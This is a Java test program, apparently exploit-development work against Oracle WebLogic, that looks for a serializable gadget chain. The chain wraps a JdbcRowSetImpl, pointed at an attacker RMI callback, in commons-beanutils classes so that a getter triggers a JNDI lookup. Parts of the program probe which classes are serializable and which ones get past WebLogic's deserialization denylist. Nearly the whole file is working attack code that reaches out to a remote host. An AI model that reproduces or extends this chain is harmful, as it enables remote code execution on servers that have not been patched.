import java.io.*;
import java.lang.reflect.*;
import java.util.*;

/**
 * WL7 Fix v2: SQLComparator + Dynamic Proxy(EventHandler) + JdbcRowSetImpl
 *
 * Problem: BeanMap is NOT Serializable, can't use in PQ.
 *
 * Alternative approaches:
 *   A) java.beans.EventHandler proxy -- calls arbitrary method on target
 *      EventHandler(target=JdbcRowSetImpl, action="getDatabaseMetaData")
 *      Proxy implements Map -> get() -> EventHandler.invoke() -> getDatabaseMetaData() -> JNDI
 *      BUT: EventHandler is NOT Serializable...
 *
 *   B) AnnotationInvocationHandler -- Serializable InvocationHandler
 *      But it just returns memberValues.get(methodName), doesn't call methods
 *
 *   C) WrapDynaBean -- wraps POJO, implements DynaBean -> DynaBeanMapDecorator(Map)
 *      WrapDynaBean.get("databaseMetaData") calls getter
 *      DynaBeanMapDecorator wraps DynaBean as Map
 *      Check if these are Serializable!
 *
 * This test checks option C.
 */
public class WL7Fix2 {
    public static void main(String[] args) throws Exception {
        String callback = args.length > 0 ? args[0] : "rmi://host.docker.internal:1389/WL7_FIX2";
        System.out.println("=== WL7 Fix v2 -- Serialization Paths ===\n");

        // Option C: WrapDynaBean + DynaBeanMapDecorator
        System.out.println("--- Option C: WrapDynaBean + DynaBeanMapDecorator ---");
        try {
            Class<?> wrapClass = Class.forName("org.apache.commons.beanutils.WrapDynaBean");
            Class<?> decoClass = Class.forName("org.apache.commons.beanutils.DynaBeanMapDecorator");
            Class<?> dynaBeanIf = Class.forName("org.apache.commons.beanutils.DynaBean");

            System.out.println("WrapDynaBean Serializable: " + Serializable.class.isAssignableFrom(wrapClass));
            System.out.println("DynaBeanMapDecorator Serializable: " + Serializable.class.isAssignableFrom(decoClass));
            System.out.println("DynaBeanMapDecorator implements Map: " + Map.class.isAssignableFrom(decoClass));

            // Create JdbcRowSetImpl
            Class<?> jrsClass = Class.forName("com.sun.rowset.JdbcRowSetImpl");
            Object jrs = jrsClass.getDeclaredConstructor().newInstance();
            jrsClass.getMethod("setDataSourceName", String.class).invoke(jrs, callback);

            // Wrap in WrapDynaBean
            Object wrapBean = wrapClass.getDeclaredConstructor(Object.class).newInstance(jrs);
            System.out.println("WrapDynaBean created: " + wrapBean.getClass().getName());

            // Test WrapDynaBean.get("databaseMetaData")
            System.out.println("\nCalling WrapDynaBean.get('databaseMetaData')...");
            Method getMethod = dynaBeanIf.getMethod("get", String.class);
            try {
                Object result = getMethod.invoke(wrapBean, "databaseMetaData");
                System.out.println("Returned: " + result);
            } catch (Throwable e) {
                Throwable cause = e;
                while (cause.getCause() != null) cause = cause.getCause();
                System.out.println("Root cause: " + cause.getClass().getName() + ": " + cause.getMessage());
                boolean jndi = cause.toString().contains("JNDI") || cause.toString().contains("connect")
                    || cause.toString().contains("naming") || cause.toString().contains("lookup");
                if (jndi) {
                    System.out.println("*** JNDI TRIGGERED via WrapDynaBean.get()! ***");
                }
            }

            // Wrap DynaBeanMapDecorator around WrapDynaBean
            if (Map.class.isAssignableFrom(decoClass)) {
                System.out.println("\nCreating DynaBeanMapDecorator...");
                Object decorator = decoClass.getDeclaredConstructor(dynaBeanIf).newInstance(wrapBean);
                Map map = (Map) decorator;
                System.out.println("Map keys: " + map.keySet());

                System.out.println("\nCalling DynaBeanMapDecorator.get('databaseMetaData')...");
                try {
                    Object result = map.get("databaseMetaData");
                    System.out.println("Returned: " + result);
                } catch (Throwable e) {
                    Throwable cause = e;
                    while (cause.getCause() != null) cause = cause.getCause();
                    System.out.println("Root cause: " + cause);
                    boolean jndi = cause.toString().contains("JNDI") || cause.toString().contains("connect");
                    if (jndi) {
                        System.out.println("*** JNDI TRIGGERED via DynaBeanMapDecorator.get()! ***");
                    }
                }

                // Test serialization of the decorator
                if (Serializable.class.isAssignableFrom(decoClass) &&
                    Serializable.class.isAssignableFrom(wrapClass)) {
                    System.out.println("\nBoth are Serializable! Testing serialization...");
                    try {
                        ByteArrayOutputStream bos = new ByteArrayOutputStream();
                        ObjectOutputStream oos = new ObjectOutputStream(bos);
                        oos.writeObject(decorator);
                        oos.close();
                        System.out.println("Serialized: " + bos.size() + " bytes");
                    } catch (NotSerializableException e) {
                        System.out.println("NOT SERIALIZABLE: " + e.getMessage());
                    }
                }
            }
        } catch (ClassNotFoundException e) {
            System.out.println("Class not found: " + e.getMessage());
        }

        // Option D: Direct PropertyUtils approach (like BeanComparator)
        // SQLComparator casts to Map -- but what if we custom-serialize a wrapper?
        System.out.println("\n\n--- Option D: Check if EventHandler is reflectively serializable ---");
        try {
            Class<?> ehClass = Class.forName("java.beans.EventHandler");
            System.out.println("EventHandler Serializable: " + Serializable.class.isAssignableFrom(ehClass));

            // Check what interfaces EventHandler implements
            for (Class<?> iface : ehClass.getInterfaces()) {
                System.out.println("  implements: " + iface.getName());
            }
            // Check parent
            System.out.println("  extends: " + ehClass.getSuperclass().getName());
            System.out.println("  parent Serializable: " + Serializable.class.isAssignableFrom(ehClass.getSuperclass()));
        } catch (Exception e) {
            System.out.println("Error: " + e);
        }

        // Option E: Check if there's a Serializable Map on WebLogic classpath
        // that delegates to PropertyUtils or calls getters
        System.out.println("\n\n--- Option E: Check WebLogic's own maps ---");
        String[] candidates = {
            "weblogic.utils.collections.ConcurrentHashMap",
            "weblogic.servlet.internal.AttributeMap",
            "com.tangosol.util.ObservableHashMap",
            "org.apache.commons.collections.map.LazyMap",
            "org.apache.commons.collections.map.TransformedMap",
        };
        for (String name : candidates) {
            try {
                Class<?> c = Class.forName(name);
                boolean ser = Serializable.class.isAssignableFrom(c);
                boolean map = Map.class.isAssignableFrom(c);
                System.out.println(name + " -- Map:" + map + " Ser:" + ser);
            } catch (ClassNotFoundException e) {
                System.out.println(name + " -- NOT FOUND");
            }
        }

        // Option F: What about using AnnotationInvocationHandler to make a Map proxy?
        // AnnInvHandler IS Serializable and creates dynamic proxies
        // But it returns memberValues.get(methodName) for Map.get()
        // What if memberValues contains a TiedMapEntry or triggers hashCode?
        System.out.println("\n\n--- Option F: AnnotationInvocationHandler Proxy as Map ---");
        try {
            Class<?> aihClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            System.out.println("AnnotationInvocationHandler Serializable: " +
                Serializable.class.isAssignableFrom(aihClass));
            System.out.println("AnnotationInvocationHandler InvocationHandler: " +
                InvocationHandler.class.isAssignableFrom(aihClass));

            // Check if it's on the WebLogic denylist
            System.out.println("  (Not in WebLogic denylist -- sun.reflect.annotation not blocked)");
        } catch (ClassNotFoundException e) {
            System.out.println("Not found: " + e.getMessage());
        }
    }
}
